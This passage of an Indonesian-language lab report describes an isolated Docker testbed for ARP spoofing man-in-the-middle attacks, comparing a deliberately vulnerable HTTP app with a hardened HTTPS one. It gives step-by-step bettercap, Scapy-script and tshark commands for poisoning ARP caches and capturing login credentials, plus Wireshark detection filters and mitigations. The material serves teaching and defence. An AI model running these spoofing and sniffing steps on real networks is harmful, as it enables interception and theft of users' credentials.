**Langkah Penggunaan Bettercap:**

1. Jalankan dari container attacker: `bettercap -iface eth0 -caplet bettercap/mitm_attack.cap`
2. Bettercap otomatis melakukan ARP Spoofing dan mengaktifkan HTTP proxy
3. Saat victim login di vulnerable app, kredensial muncul di output dengan tag `[http.proxy.auth]`
4. Traffic disimpan ke file `.pcap` untuk analisis lanjutan di Wireshark

#### 3.4.2 Wireshark

Wireshark digunakan sebagai packet analyzer utama untuk memverifikasi dan memvisualisasikan hasil serangan MITM secara detail [13][14].

| Fitur yang Digunakan | Fungsi                                                    |
| -------------------- | --------------------------------------------------------- |
| Live Capture         | Menangkap paket secara real-time pada interface container (eth0) |
| Display Filter       | Memfilter paket spesifik (ARP, HTTP, TLS)                 |
| Follow HTTP Stream   | Melihat keseluruhan sesi HTTP termasuk body request       |
| ARP Analysis         | Mendeteksi duplikasi MAC dan gratuitous ARP               |
| Protocol Hierarchy   | Melihat distribusi protokol dalam traffic                 |
| Export Objects       | Mengekstrak file/data dari HTTP traffic                   |

**Display Filter Utama yang Digunakan:**

| Filter                                     | Tujuan                                   |
| ------------------------------------------ | ---------------------------------------- |
| `arp.opcode == 2`                        | Mendeteksi ARP Reply (indikasi spoofing) |
| `arp.duplicate-address-detected`         | Deteksi duplikasi IP (ARP Spoofing)      |
| `http.request.method == "POST"`          | Menangkap login request (POST)           |
| `http.request.uri contains "/api/login"` | Filter spesifik endpoint login           |
| `tcp.port == 5000 && http`               | Traffic HTTP ke vulnerable backend       |
| `tls.record.content_type == 23`          | TLS Application Data (terenkripsi)       |
| `tcp.port == 5443 && tls`                | Traffic HTTPS ke secure backend          |

**Langkah Penggunaan Wireshark:**

1. Di container attacker, jalankan tshark: `tshark -i eth0 -f "arp or port 5000 or port 5443" -w /tmp/capture.pcap`
3. Mulai capture → jalankan ARP Spoofing → victim login
4. Stop capture → gunakan display filter untuk analisis
5. Klik kanan pada HTTP POST → **Follow → HTTP Stream** → lihat kredensial plaintext
6. Bandingkan: filter `tcp.port == 5443` → TLS encrypted → data tidak terbaca

**Langkah Penggunaan tshark (CLI Wireshark):**

```bash
# Capture traffic dan simpan ke file pcap (dari container attacker)
tshark -i eth0 -f "arp or port 5000 or port 5443" \
  -w /tmp/mitm-capture.pcap

# Live display kredensial HTTP POST
tshark -i eth0 -f "tcp port 5000" \
  -Y "http.request.method == POST" \
  -T fields -e ip.src -e ip.dst \
  -e http.request.uri -e http.file_data
```

### 3.5 Prosedur Pengujian (Step-by-Step)

#### Fase 1: Persiapan Environment

**Langkah 1.1 — Konfigurasi Environment:**

```bash
# Copy file .env.example ke .env
cp .env.example .env

# Edit .env jika menggunakan Tailscale untuk management
nano .env
```

Isi `.env`:
```
TS_AUTHKEY=tskey-auth-xxxxx-xxxxxxxxxxxxxxxx  # Opsional, untuk SSH management
JWT_SECRET=your-secret-key-here
```

**Langkah 1.2 — Generate Sertifikat TLS (untuk Secure App):**

```bash
cd secure-app/backend/certs
bash generate-certs.sh
# Output: server.key dan server.crt (self-signed certificate)
cd ../../..
```

**Langkah 1.3 — Build dan Deploy Semua Container:**

```bash
# Build semua image
docker compose build

# Jalankan semua container (detached mode)
docker compose up -d

# Verifikasi semua container berjalan
docker compose ps
```

Output yang diharapkan:
```
NAME              STATUS
attacker          running    ← Kali Linux (attack tools)
client-victim     running    ← Webtop XFCE desktop
vuln-frontend     running    ← React HTTP frontend
vuln-backend      running    ← Express HTTP backend
sec-frontend      running    ← React HTTPS frontend
sec-backend       running    ← Express HTTPS backend
ts-secure         running    ← Tailscale sidecar (management)
```

**Langkah 1.4 — Verifikasi Konektivitas:**

```bash
# Masuk ke container attacker
docker compose exec attacker bash

# Test konektivitas ke semua container
ping -c 3 172.20.0.10   # client-victim
ping -c 3 172.20.0.20   # vulnerable-frontend
ping -c 3 172.20.0.21   # vulnerable-backend
ping -c 3 172.20.0.30   # secure-frontend
ping -c 3 172.20.0.31   # secure-backend

# Scan network (dari attacker container)
arp-scan --interface=eth0 172.20.0.0/24
```

#### Fase 2: Akses Client Victim dan Login

**Langkah 2.1 — Buka Desktop Victim dari Browser Host:**

```
Buka browser di host → http://localhost:3080
```

Akan muncul desktop Linux XFCE dengan browser bawaan (Firefox/Chromium).

**Langkah 2.2 — Akses Vulnerable App dari Client Victim:**

Di dalam browser webtop:
1. Buka `http://172.20.0.20:3000` → halaman login vulnerable app
2. **Jangan login dulu** — tunggu attacker siap di Fase 3

**Langkah 2.3 — Akses Secure App dari Client Victim:**

Di dalam browser webtop:
1. Buka `https://172.20.0.30:3443` → halaman login secure app
2. Accept self-signed certificate warning
3. **Jangan login dulu** — tunggu attacker siap di Fase 3

#### Fase 3: Eksekusi Serangan MITM (3 Metode)

> **⚠️ PENTING:** Semua perintah serangan dijalankan dari **container attacker** (`docker compose exec attacker bash`).

**Langkah 3.0 — IP Forwarding sudah diaktifkan otomatis** oleh entrypoint container attacker.

---

##### Metode A: Scapy + Python Sniffer

Metode ini menggunakan script Python buatan sendiri untuk ARP Spoofing dan credential sniffing.

**Terminal 1 — ARP Spoofing (meracuni ARP cache client-victim):**

```bash
# ARP Spoofing: target = client-victim, gateway = vulnerable-app
python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.21

# Output yang diharapkan:
# [*] Starting ARP Spoofing...
# [*] Target: 172.20.0.10 (client-victim)
# [*] Gateway: 172.20.0.21 (vulnerable-backend)
# [+] Sending spoofed ARP packets...
```

**Terminal 2 — Credential Sniffer (menangkap HTTP login):**

```bash
# Sniff HTTP POST requests pada port 5000 (backend vulnerable)
python3 sniff_credentials.py --mode http --port 5000

# Output saat victim login:
# [!] CREDENTIAL CAPTURED!
# [*] Source: 172.20.0.10 → Destination: 172.20.0.21
# [*] URL: POST /api/login
# [*] Username: admin
# [*] Password: admin123       ← PLAINTEXT!
```

**Terminal 3 (opsional) — Sniff HTTPS untuk perbandingan:**

```bash
# Sniff traffic HTTPS — membuktikan data terenkripsi
python3 sniff_credentials.py --mode https --port 5443

# Output saat victim login ke secure app:
# [*] HTTPS Traffic dari 172.20.0.10 → Port 5443
# [🔒] Data TERENKRIPSI - Tidak dapat dibaca!
# [*] TLS Version: TLS 1.3
```

**Di Client Victim (webtop browser):**
1. Login ke `http://172.20.0.20:3000` dengan: `admin` / `admin123`
2. Lihat Terminal 2 → **kredensial tertangkap dalam plaintext!**
3. Login ke `https://172.20.0.30:3443` dengan credentials yang sama
4. Lihat Terminal 3 → **data terenkripsi, tidak terbaca!**

**Hentikan serangan:** Tekan `Ctrl+C` di Terminal 1 → ARP cache otomatis dipulihkan.

---

##### Metode B: Bettercap (All-in-One MITM)

Bettercap menggabungkan ARP Spoofing + HTTP Proxy + Credential Extraction dalam satu tool.

**Terminal 1 — Jalankan Bettercap dengan Caplet:**

```bash
# Jalankan Bettercap pada interface bridge (dari container attacker)
bettercap -iface eth0 -caplet bettercap/mitm_attack.cap

# Bettercap otomatis melakukan:
# 1. Network discovery (net.probe)
# 2. ARP Spoofing full-duplex (arp.spoof)
# 3. HTTP Proxy + credential sniffing (http.proxy)
# 4. Network sniffing + pcap export (net.sniff)
```

**Output saat victim login ke HTTP:**
```
[19:30:15] [sys.log] [inf] arp.spoof starting net.probe...
[19:30:18] [sys.log] [inf] arp.spoof victim 172.20.0.10 spoofed
[19:30:45] [http.proxy.auth] POST http://vulnerable-app:5000/api/login
           → username=admin password=admin123   ← TERTANGKAP!
```

**Output saat victim login ke HTTPS:**
```
[19:35:10] [net.sniff] TLS handshake detected → secure-app:5443
[19:35:15] [net.sniff] encrypted data (cannot parse)
           → Tidak ada kredensial yang tertangkap   ← AMAN!
```

**Di Client Victim:** Login ke kedua app, lalu bandingkan output Bettercap.

**File capture tersimpan di:** `/tmp/bettercap-capture.pcap` (bisa dibuka di Wireshark).

---

##### Metode C: Scapy + Wireshark (Visual Analysis)

Metode ini menggabungkan ARP Spoofing via Scapy dengan analisis visual menggunakan Wireshark GUI.

**Terminal 1 — ARP Spoofing:**

```bash
python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.21
```

**Terminal 2 — Jalankan Wireshark GUI:**

```bash
# Buka Wireshark
wireshark &

# 1. Dari container attacker:
tshark -i eth0 -f "arp or port 5000 or port 5443" -w /tmp/capture.pcap
# 2. Set Capture Filter: arp or port 5000 or port 5443
# 3. Klik tombol "Start" (ikon sirip hiu biru)
```

**Atau gunakan tshark (CLI) untuk capture + live display:**

```bash
# Capture semua traffic ke file pcap
tshark -i eth0 -f "arp or port 5000 or port 5443" \
  -w /tmp/mitm-capture.pcap &

# Live display HTTP POST credentials
tshark -i eth0 -f "tcp port 5000" \
  -Y "http.request.method == POST" \
  -T fields -e ip.src -e ip.dst \
  -e http.request.uri -e http.file_data
```

**Di Client Victim:** Login ke kedua app.

**Analisis di Wireshark setelah capture:**

1. **Deteksi ARP Spoofing:**
   - Filter: `arp.opcode == 2`
   - Terlihat ARP Reply berulang dari MAC host yang mengklaim IP server → bukti poisoning

2. **Lihat Kredensial HTTP (Plaintext):**
   - Filter: `http.request.method == "POST"`
   - Klik kanan pada paket → **Follow → HTTP Stream**
   - Di panel stream terlihat: `{"username":"admin","password":"admin123"}` → **TERBACA!**

3. **Verifikasi HTTPS (Encrypted):**
   - Filter: `tcp.port == 5443 && tls`
   - Klik kanan → **Follow → TLS Stream**
   - Hanya terlihat ciphertext acak → **TIDAK TERBACA!**

4. **Protocol Hierarchy:**
   - Menu: **Statistics → Protocol Hierarchy**
   - Bandingkan: HTTP menampilkan JSON data, TLS hanya menampilkan Application Data

#### Fase 4: Analisis dan Perbandingan

1. Bandingkan output dari ketiga metode:
   - Scapy sniffer: plaintext credentials di terminal
   - Bettercap: auto-detected credentials + pcap file
   - Wireshark: visual comparison Follow HTTP Stream vs Follow TLS Stream
2. Analisis ARP table di Wireshark dengan filter `arp.opcode == 2` untuk membuktikan spoofing berhasil
3. Screenshot semua hasil untuk dokumentasi laporan
4. Hentikan semua serangan → ARP cache dipulihkan secara otomatis

---

## 4. Hasil dan Pembahasan

### 4.1 Hasil Serangan terhadap Vulnerable App (HTTP)

**Skenario:** Attacker melakukan ARP Spoofing → victim login ke `http://vulnerable-app:3000`

**Hasil Sniffing:**

```
[2025-xx-xx HH:MM:SS] HTTP Traffic Terdeteksi
Source: 172.20.0.10 → Destination: 172.20.0.21

  🔓 LOGIN REQUEST TERDETEKSI!
  ╔══════════════════════════════════════╗
  ║  KREDENSIAL DITEMUKAN (PLAINTEXT)!   ║
  ╠══════════════════════════════════════╣
  ║  Username: admin                     ║
  ║  Password: admin123                  ║
  ╚══════════════════════════════════════╝
```

**Analisis:**

- Username dan password **terbaca jelas** dalam format plaintext
- Data transfer (penerima, jumlah, keterangan) juga dapat diintersep
- Token autentikasi (Base64) dapat di-decode dengan mudah
- Server merespons dengan data sensitif termasuk password user

**Kerentanan yang terbukti (OWASP Top 10:2025) [4]:**

- **A04:2025 (Cryptographic Failures)**: Tidak ada enkripsi pada transmisi data [17]
- **A02:2025 (Security Misconfiguration)**: CORS allow all, tanpa security headers [9]
- **A07:2025 (Authentication Failures)**: Password disimpan plaintext, token tanpa expiry [19]

### 4.2 Hasil Serangan terhadap Secure App (HTTPS)

**Skenario:** Attacker melakukan ARP Spoofing → victim login ke `https://secure-app:3443`

**Hasil Sniffing:**

```
[HH:MM:SS] HTTPS Traffic dari 172.20.0.10 → Port 5443
  🔒 Data TERENKRIPSI - Tidak dapat dibaca!
  Hex dump (tidak berguna): 17030300bf5a8e2f3c...
  ↑ Attacker tidak dapat mengekstrak informasi apapun
```

**Analisis:**

- Data **sepenuhnya terenkripsi** — attacker hanya melihat ciphertext
- Meskipun ARP Spoofing berhasil, TLS melindungi konten data [16]
- HSTS header mencegah downgrade ke HTTP [18]
- Rate limiting membatasi percobaan brute force [9]

### 4.3 Hasil Analisis Menggunakan Bettercap

**Skenario:** Attacker menjalankan Bettercap dengan caplet `mitm_attack.cap`

**Output Bettercap saat victim login ke HTTP (Vulnerable):**

```
[19:30:15] [sys.log] [inf] arp.spoof starting net.probe...
[19:30:18] [sys.log] [inf] arp.spoof victim 172.20.0.10 spoofed
[19:30:25] [http.proxy.auth] POST http://vulnerable-app:5000/api/login
           ├── Content-Type: application/json
           ├── Username: admin
           └── Password: admin123
[19:30:30] [http.proxy.auth] POST http://vulnerable-app:5000/api/transfer
           ├── From: admin
           ├── To: user1
           └── Amount: 500000
```

**Output Bettercap terhadap HTTPS (Secure):**

```
[19:35:10] [sys.log] [inf] arp.spoof victim 172.20.0.10 spoofed
[19:35:15] [net.sniff] TLS handshake detected → secure-app:5443
           └── Encrypted Application Data (cannot parse)
```

**Analisis Bettercap:**

- Modul `arp.spoof` berhasil meracuni ARP cache pada kedua target [12]
- Modul `http.proxy` otomatis mendeteksi dan menampilkan kredensial HTTP [15]
- Terhadap HTTPS, Bettercap hanya mendeteksi TLS handshake tanpa bisa membaca data [16]
- File `.pcap` yang dihasilkan dapat dibuka di Wireshark untuk analisis mendalam [13]

### 4.4 Hasil Analisis Menggunakan Wireshark

#### 4.4.1 Deteksi ARP Spoofing

Menggunakan display filter `arp.opcode == 2` [13], Wireshark menunjukkan:

```
No.  Time      Source           Destination      Protocol  Info
1    0.000     aa:bb:cc:dd:ee   ff:ff:ff:ff:ff   ARP       Who has 172.20.0.21? Tell 172.20.0.10
2    0.001     [Attacker MAC]   [Victim MAC]     ARP       172.20.0.10 is at [Attacker MAC]
3    1.001     [Attacker MAC]   [Gateway MAC]    ARP       172.20.0.21 is at [Attacker MAC]
```

- ARP Reply dari attacker mengklaim bahwa IP gateway memiliki MAC attacker
- Wireshark menandai ini sebagai **"Duplicate IP address detected"** (indikasi spoofing)
- Victim dan gateway masing-masing menerima ARP Reply palsu

#### 4.4.2 Intercept Kredensial HTTP (Follow HTTP Stream)

Menggunakan filter `http.request.method == "POST"` kemudian **Follow → HTTP Stream**:

```
POST /api/login HTTP/1.1
Host: vulnerable-app:5000
Content-Type: application/json

{"username":"admin","password":"admin123"}

---

HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"MTo...","user":{"username":"admin","password":"admin123"}}
```

- Seluruh body HTTP request dan response **terbaca jelas** dalam Wireshark
- Username, password, dan token **plaintext** — rentan terhadap pencurian

#### 4.4.3 Verifikasi HTTPS Terenkripsi

Menggunakan filter `tcp.port == 5443 && tls`:

```
No.  Time      Source           Destination      Protocol  Info
45   5.230     172.20.0.10       172.20.0.31       TLSv1.3   Client Hello
46   5.231     172.20.0.31       172.20.0.10       TLSv1.3   Server Hello, Certificate
47   5.235     172.20.0.10       172.20.0.31       TLSv1.3   Application Data [encrypted]
48   5.236     172.20.0.31       172.20.0.10       TLSv1.3   Application Data [encrypted]
```

- Setelah TLS handshake [16], semua data ditandai **"Application Data"** terenkripsi
- **Follow TCP Stream** hanya menampilkan ciphertext — **tidak berguna** bagi attacker
- Wireshark tidak dapat mendekripsi data tanpa server private key [13]

#### 4.4.4 Perbandingan Protocol Hierarchy

| Protokol | HTTP (Vulnerable)              | HTTPS (Secure)                       |
| -------- | ------------------------------ | ------------------------------------ |
| ARP      | Terlihat ARP Spoofing          | Terlihat ARP Spoofing                |
| TCP      | Connection plaintext           | Connection encrypted                 |
| HTTP     | **Body terbaca jelas**   | Tidak ada (TLS)                      |
| TLS      | Tidak ada                      | **Application Data encrypted** |
| JSON     | **Kredensial plaintext** | Tidak terlihat                       |

### 4.5 Perbandingan Hasil Keseluruhan

| Aspek                    | HTTP (Vulnerable)     | HTTPS (Secure)          |
| ------------------------ | --------------------- | ----------------------- |
| ARP Spoofing             | ✅ Berhasil           | ✅ Berhasil             |
| Data Terbaca (Scapy)     | ✅ Ya (plaintext)     | ❌ Tidak (encrypted)    |
| Data Terbaca (Bettercap) | ✅ Ya (auto-detected) | ❌ Tidak                |
| Data Terbaca (Wireshark) | ✅ Ya (Follow Stream) | ❌ Tidak (ciphertext)   |
| Username Terlihat        | ✅ Ya                 | ❌ Tidak                |
| Password Terlihat        | ✅ Ya                 | ❌ Tidak                |
| Token Terlihat           | ✅ Ya (Base64)        | ❌ Tidak                |
| Data Transfer            | ✅ Ya                 | ❌ Tidak                |
| Brute Force              | ✅ Tidak dibatasi     | ❌ Rate limited         |
| Session Hijack           | ✅ Mudah              | ❌ Sulit (JWT + expiry) |
| Password di Database     | ❌ Plaintext          | ✅ Bcrypt hash (cost 12)|
| Database Schema          | ❌ Tanpa validation   | ✅ Unique, required, enum|
| Audit Trail              | ❌ Tidak ada          | ✅ MongoDB audit_logs   |

### 4.6 Kaitan dengan Tugas Wireshark Sebelumnya

Pada tugas sebelumnya, analisis traffic menggunakan Wireshark menunjukkan:

1. **Jam Kerja**: Ditemukan akses ke berbagai layanan, beberapa menggunakan HTTP tanpa enkripsi
2. **Jam Istirahat**: Pattern traffic berbeda dengan akses ke media sosial dan streaming
3. **Data Tidak Terenkripsi**: Beberapa koneksi HTTP mengirim data tanpa enkripsi ke router/WiFi kantor

**Relevansi:** Temuan pada tugas Wireshark menunjukkan bahwa traffic HTTP yang tidak terenkripsi di jaringan kantor berpotensi menjadi target serangan MITM. Dengan menggunakan tools yang sama (Wireshark) pada project ini, dibuktikan bahwa:

- Wireshark dapat mendeteksi ARP Spoofing melalui duplikasi MAC address
- HTTP traffic yang tercapture di jaringan kantor sama rentannya — credential dapat dilihat melalui Follow HTTP Stream
- Bettercap mempermudah proses serangan yang pada tugas sebelumnya hanya diamati secara pasif

### 4.7 Solusi Keamanan yang Diimplementasikan

#### Layer Transport (Mencegah Data Terbaca — Menjawab Lee et al. [6])

| Solusi         | Implementasi                       | Efektivitas                  | Status |
| -------------- | ---------------------------------- | ---------------------------- | ------ |
| TLS/HTTPS      | OpenSSL self-signed cert, TLS 1.2+ [16] | Tinggi — data terenkripsi   | ✅ Impl. |
| HSTS           | Helmet `maxAge: 31536000` [18]         | Tinggi — mencegah downgrade | ✅ Impl. |
| Strong Ciphers | `TLS_AES_256_GCM_SHA384`         | Tinggi — cipher modern      | ✅ Impl. |

#### Layer Aplikasi (Defense in Depth — Menjawab SEED Labs [5])

| Solusi           | Implementasi                 | Efektivitas                  | Status |
| ---------------- | ---------------------------- | ---------------------------- | ------ |
| Password Hashing | bcrypt (salt: 12 rounds) [20]    | Tinggi — irreversible       | ✅ Impl. |
| JWT Token        | jsonwebtoken (1h expiry) [19]    | Tinggi — stateless auth     | ✅ Impl. |
| Rate Limiting    | express-rate-limit (5/15min) | Sedang — anti brute force   | ✅ Impl. |
| Input Validation | express-validator            | Sedang — anti injection     | ✅ Impl. |
| Security Headers | Helmet (CSP, X-Frame, etc.) [10] | Sedang — anti XSS/clickjack | ✅ Impl. |
| CORS Restricted  | Origin whitelist             | Sedang — anti CSRF          | ✅ Impl. |
| Audit Logging    | MongoDB audit_logs (TTL 7d)  | Sedang — security monitoring | ✅ Impl. |

#### Layer Data (Database Security — Microservices)

Satu instance MongoDB melayani kedua aplikasi — mendemonstrasikan bahwa keamanan **bukan hanya soal infrastruktur** (database yang sama), tetapi bagaimana **aplikasi memperlakukan data sensitif**.

| Aspek            | Vulnerable App (vulnerable_db)     | Secure App (secure_db)                 |
| ---------------- | ---------------------------------- | -------------------------------------- |
| Password Storage | Plaintext (`admin123`)             | Bcrypt hash (`$2b$12$...`)             |
| Schema Validation| Tidak ada constraint               | unique, required, enum, minlength      |
| Password in Query| `select: true` (default)           | `select: false` (harus eksplisit)      |
| TTL pada Data    | Tidak ada                          | Transactions 24h, audit_logs 7d        |
| Index            | Tidak ada                          | Unique index pada username             |
| Error Response   | Stack trace + connection string    | Generic "Internal server error"        |
| Audit Trail      | Tidak ada                          | Setiap login/transfer dicatat          |

#### Layer Network (Mencegah/Mengurangi Dampak ARP Spoofing)

| Solusi                   | Deskripsi                        | Implementasi          | Status |
| ------------------------ | -------------------------------- | --------------------- | ------ |
| VPN Management Plane     | SSH/DB hanya via WireGuard tunnel | Tailscale sidecar [8] | ✅ Impl. |
| Network Segmentation     | Memisahkan data dan management plane | Docker bridge + VPN  | ✅ Impl. |
| Static ARP Entries       | Menambahkan entri ARP statis     | `arp -s <IP> <MAC>`  | 📋 Rekomendasi |
| Dynamic ARP Inspection   | Fitur switch managed             | Pada network switch   | 📋 Rekomendasi |
| ML-based Detection       | Deteksi anomali ARP otomatis     | Random Forest [7]     | 🔮 Future Work |

#### Keterkaitan Solusi dengan Penelitian Terdahulu

| Keterbatasan Penelitian Terdahulu | Solusi yang Diimplementasikan | Referensi |
| --------------------------------- | ----------------------------- | --------- |
| Tidak ada versi aman sebagai pembanding [6] | Dual-stack microservices (HTTP vs HTTPS) + shared MongoDB | Section 3.2, 3.3 |
| Kurang mitigasi layer aplikasi [5] | 7 kontrol keamanan aplikasi + database security | Section 4.7 |
| Kompleksitas deployment ML detection [7] | .pcap dataset dan rule-based detection | Section 4.6 |
| Docker bridge rentan ARP Spoofing [6] | Tailscale VPN management plane | Section 3.2 |
| Tidak ada perbandingan penyimpanan data [6] | vulnerable_db (plaintext) vs secure_db (bcrypt) | Section 4.7 |


---

## 5. Kesimpulan dan Future Work

### 5.1 Kesimpulan

1. **ARP Spoofing tetap menjadi ancaman nyata** — Protokol ARP [11] yang stateless dan tanpa autentikasi memungkinkan serangan cache poisoning (T1557.002) [2] untuk mencapai posisi Man-in-the-Middle (T1557) [1].
2. **HTTP tanpa enkripsi sangat rentan** — Demonstrasi membuktikan bahwa kredensial, token, dan data transaksi yang dikirim melalui HTTP [21] dapat diintersep dan dibaca dalam plaintext oleh penyerang (A04:2025 - Cryptographic Failures) [4].
3. **HTTPS/TLS efektif melindungi data** — Meskipun ARP Spoofing berhasil, enkripsi TLS [16] memastikan data yang ditangkap tidak dapat dibaca, menjadikan serangan sniffing tidak efektif.
4. **Defense in Depth diperlukan** — Keamanan yang komprehensif memerlukan perlindungan di semua layer: network (VLAN, DAI), transport (TLS) [16][17], aplikasi (JWT [19], bcrypt [20], rate limiting, security headers [10]), dan data (schema validation, audit logging).
5. **Keamanan data ditentukan oleh layer aplikasi, bukan infrastruktur** — Menggunakan satu instance MongoDB yang sama, vulnerable app menyimpan password plaintext sementara secure app menyimpan bcrypt hash. Ini membuktikan bahwa keamanan bergantung pada bagaimana aplikasi memperlakukan data, bukan semata-mata pada teknologi database.
6. **Container networking memerlukan perhatian khusus** — Docker bridge network default rentan terhadap ARP spoofing antar container [6], sehingga diperlukan konfigurasi keamanan tambahan.

### 5.2 Future Work

1. **Implementasi Dynamic ARP Inspection (DAI)** pada level switch untuk pencegahan di layer network
2. **Machine Learning-based Detection** menggunakan Random Forest atau LSTM untuk deteksi anomali ARP secara real-time [7]
3. **Mutual TLS (mTLS)** untuk autentikasi dua arah antara client dan server
4. **Certificate Pinning** pada aplikasi mobile/desktop untuk mencegah serangan SSL stripping
5. **SDN-based Security** menggunakan Software-Defined Networking untuk kontrol traffic yang lebih granular
6. **Automated Incident Response** yang secara otomatis mengisolasi host yang terdeteksi melakukan ARP spoofing
7. **Integrasi dengan SIEM** untuk security monitoring dan alerting yang terpusat

---

## Referensi

1. MITRE ATT&CK. (2024). *T1557 - Adversary-in-the-Middle*. https://attack.mitre.org/techniques/T1557/
2. MITRE ATT&CK. (2024). *T1557.002 - ARP Cache Poisoning*. https://attack.mitre.org/techniques/T1557/002/
3. MITRE ATT&CK. (2024). *T1040 - Network Sniffing*. https://attack.mitre.org/techniques/T1040/
4. OWASP Foundation. (2025). *OWASP Top 10:2025*. https://owasp.org/Top10/
5. Du, W. (2024). *SEED Labs - ARP Cache Poisoning Attack Lab*. Syracuse University. https://seedsecuritylabs.org/Labs_20.04/Networking/ARP_Attack/
6. Lee, H., Kwon, S., & Lee, J.-H. (2023). "Experimental Analysis of Security Attacks for Docker Container Communications." *Electronics (MDPI)*, 12(4), 940. https://doi.org/10.3390/electronics12040940
7. Kumar, M. & Dash, C.S. (2024). "Detecting and Preventing ARP Spoofing Attacks Using Real-Time Data Analysis and Machine Learning." *IJIRCST*.
8. Tailscale Inc. (2024). *Tailscale in Docker*. https://tailscale.com/kb/1282/docker
9. Express.js. (2024). *Security Best Practices*. https://expressjs.com/en/advanced/best-practice-security.html
10. Helmetjs. (2024). *Helmet - Secure Express Apps*. https://helmetjs.github.io/
11. RFC 826. Plummer, D.C. (1982). *An Ethernet Address Resolution Protocol*. IETF. https://tools.ietf.org/html/rfc826
12. Bettercap Project. (2024). *Bettercap Documentation - ARP Spoofing Module*. https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/
13. Wireshark Foundation. (2024). *Wireshark User's Guide - Display Filters*. https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html
14. Combs, G. et al. (2024). *tshark - Terminal-based Wireshark*. https://www.wireshark.org/docs/man-pages/tshark.html
15. Bettercap Project. (2024). *HTTP Proxy Module*. https://www.bettercap.org/modules/ethernet/proxies/http.proxy/
16. RFC 8446. Rescorla, E. (2018). *The Transport Layer Security (TLS) Protocol Version 1.3*. IETF. https://tools.ietf.org/html/rfc8446
17. RFC 2818. Rescorla, E. (2000). *HTTP Over TLS*. IETF. https://tools.ietf.org/html/rfc2818
18. RFC 6797. Hodges, J., Jackson, C., & Barth, A. (2012). *HTTP Strict Transport Security (HSTS)*. IETF. https://tools.ietf.org/html/rfc6797
19. RFC 7519. Jones, M., Bradley, J., & Sakimura, N. (2015). *JSON Web Token (JWT)*. IETF. https://tools.ietf.org/html/rfc7519
20. Provos, N. & Mazières, D. (1999). "A Future-Adaptable Password Scheme." *Proc. USENIX Annual Technical Conference, FREENIX Track*. https://www.usenix.org/legacy/events/usenix99/provos.html
21. Mozilla. (2024). *HTTP Overview*. MDN Web Docs. https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview
22. Mozilla. (2024). *Transport Layer Security*. MDN Web Docs. https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security

---

## Lampiran

### Lampiran A: Referensi Display Filter Wireshark

Daftar lengkap display filter Wireshark yang digunakan dalam penelitian ini untuk mendeteksi ARP Spoofing, menangkap kredensial HTTP, dan memverifikasi keamanan HTTPS. Filter dimasukkan di kolom **Display Filter** pada Wireshark GUI setelah capture dimulai.

#### A.1 Deteksi ARP Spoofing

| Filter | Fungsi |
| ------ | ------ |
| `arp` | Menampilkan semua paket ARP (Request dan Reply) |
| `arp.opcode == 2` | Hanya ARP Reply — serangan ARP Spoofing mengirim banyak Reply palsu |
| `arp.duplicate-address-detected` | Mendeteksi duplikasi IP (satu IP memiliki >1 MAC) — indikasi spoofing |
| `arp.isgratuitous == 1` | Gratuitous ARP (Reply tanpa Request) — sering dipakai dalam serangan |
| `arp.src.proto_ipv4 == 172.20.0.x` | Filter ARP dari IP tertentu (ganti dengan IP target) |
| `arp.dst.proto_ipv4 == 172.20.0.x` | Filter ARP ke IP tertentu (ganti dengan IP target) |

**Cara analisis:** Jika terlihat banyak ARP Reply dari satu MAC yang mengklaim IP berbeda-beda, itu adalah bukti ARP Cache Poisoning (T1557.002).

#### A.2 Sniffing HTTP — Vulnerable App (Plaintext)

| Filter | Fungsi |
| ------ | ------ |
| `http` | Semua traffic HTTP |
| `http.request.method == "POST"` | HTTP POST request — login form biasanya menggunakan POST |
| `http.request.uri contains "/api/login"` | Filter spesifik ke endpoint login |
| `http.request.uri contains "/api/transfer"` | Filter ke endpoint transfer data |
| `tcp.port == 5000 && http` | Traffic HTTP ke port 5000 (vulnerable backend) |
| `ip.dst == 172.20.0.x && http` | Traffic HTTP ke IP vulnerable-app tertentu |
| `http.request.method == "POST" && http.content_type contains "json"` | POST request dengan body JSON (berisi kredensial) |
| `http.response.code == 200 && http.content_type contains "json"` | Response sukses yang berisi data user |

**Cara melihat kredensial plaintext:**
1. Terapkan filter `http.request.method == "POST"`
2. Klik kanan pada paket → **Follow → HTTP Stream**
3. Di panel stream, terlihat body JSON: `{"username":"admin","password":"admin123"}`

#### A.3 Verifikasi HTTPS — Secure App (Encrypted)

| Filter | Fungsi |
| ------ | ------ |
| `tls` | Semua traffic TLS/SSL |
| `tls.handshake.type == 1` | TLS ClientHello — menunjukkan koneksi HTTPS dimulai |
| `tcp.port == 5443 && tls` | Traffic TLS ke port 5443 (secure backend) |
| `tls.record.version >= 0x0303` | Hanya TLS 1.2+ (0x0303 = TLS 1.2) |
| `tls.handshake.ciphersuite` | Melihat cipher suite yang dinegosiasikan |
| `tls.record.content_type == 23` | TLS Application Data — data yang sudah terenkripsi |

**Cara memverifikasi keamanan HTTPS:**
1. Terapkan filter `tcp.port == 5443 && tls`
2. Klik kanan → **Follow → TLS Stream**
3. Hanya terlihat ciphertext (karakter acak) — data **tidak terbaca**

#### A.4 Perbandingan HTTP vs HTTPS

| Filter | Fungsi |
| ------ | ------ |
| `tcp.port == 5000` | Semua traffic ke vulnerable-app (HTTP) |
| `tcp.port == 5443` | Semua traffic ke secure-app (HTTPS) |
| `tcp.port == 5000 \|\| tcp.port == 5443` | Gabungan — bandingkan keduanya secara bersamaan |

**Cara membandingkan:**
1. Terapkan filter gabungan
2. Paket ke port 5000: HTTP headers dan body terbaca sebagai plaintext
3. Paket ke port 5443: hanya terlihat TLS record dengan ciphertext
4. Menu **Statistics → Protocol Hierarchy** untuk melihat distribusi protokol

#### A.5 Filter Lanjutan (Advanced)

| Filter | Fungsi |
| ------ | ------ |
| `eth.src == aa:bb:cc:dd:ee:ff` | Filter berdasarkan MAC address attacker (ganti MAC) |
| `eth.src != <real_mac> && ip.src == <victim_ip>` | Deteksi traffic MITM — MAC source bukan milik IP sebenarnya |
| `dns` | DNS request — melihat domain yang diakses victim |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | TCP SYN — mendeteksi koneksi baru |

#### A.6 Capture Filter (Sebelum Memulai Capture)

